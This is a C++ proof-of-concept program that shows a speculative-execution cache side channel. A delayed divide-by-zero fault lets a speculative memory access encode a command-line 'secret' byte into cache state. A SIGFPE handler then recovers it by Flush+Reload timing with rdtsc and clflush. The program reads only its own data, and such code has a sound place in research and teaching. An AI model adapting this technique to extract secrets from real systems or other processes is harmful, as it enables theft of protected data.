#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <iostream>

using namespace std;

const size_t CACHE_LINE_SIZE = 4096;
const size_t MAX_SEND_VALUE = 8;

void setup_signal_handler();
int clear_cache();

volatile uint8_t *cache;

int probe(volatile uint8_t *adrs) {
    volatile unsigned long time;

    asm __volatile__ (
                " mfence \n"
                " lfence \n"
                " rdtsc \n"
                " lfence \n"
                " movl %%eax, %%esi \n"
                " movl (%1), %%eax \n"
                " lfence \n"
                " rdtsc \n"
                " subl %%esi, %%eax \n"
                " clflush 0(%1) \n"
                : "=a" (time)
                : "c" (adrs)
                : "%esi", "%edx");

    return time;
}

void recovery_secret(int sig)
{
    int times[MAX_SEND_VALUE];

    for(int i=0;i<MAX_SEND_VALUE;i++)
    {
        times[i] = probe(cache + CACHE_LINE_SIZE*i);
    }

    for(int i=0;i<MAX_SEND_VALUE;i++)
    {
        cout<<i<<": "<<times[i]<<endl;
    }

    exit(sig);
}

int speculative_transfer(int div, uint8_t secret)
{
    uint8_t data = 0;
    int res = 0;

    // rise_exception after delay
    int a=div;
    for(int i=0;i<100000;i++)
        a+=i;
    data = a / div;

    // speculative
    res += cache[CACHE_LINE_SIZE*secret];

    return res + data;
}

int main(int argc, char *argv[])
{
    cout<<"start app\n";

    // setup cached memory
    cache = (volatile uint8_t*)aligned_alloc(CACHE_LINE_SIZE, CACHE_LINE_SIZE*MAX_SEND_VALUE);
    memset((void*)cache, 0, CACHE_LINE_SIZE*MAX_SEND_VALUE);

    setup_signal_handler();

    // input data
    char *p;
    int div = strtol(argv[1], &p, 10);
    uint8_t secret = (uint8_t) strtol(argv[2], &p, 10);
    cout<<"div: "<<div<<" secret: "<<(int)secret<<endl;

    // run
    int result = clear_cache();
    result += speculative_transfer(div, secret);
    cout<<"result: "<<result<<endl;

    recovery_secret(0);

    return result;
}

void setup_signal_handler()
{
    struct sigaction act;
    memset(&act, 0, sizeof(act));
    act.sa_handler = recovery_secret;

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGFPE);

    act.sa_mask = set;
    sigaction(SIGFPE, &act, 0);
}

int clear_cache()
{
    for(int i=0;i<MAX_SEND_VALUE;i++)
        __builtin_ia32_clflush((void*)cache + CACHE_LINE_SIZE*i);
    return 0;
}
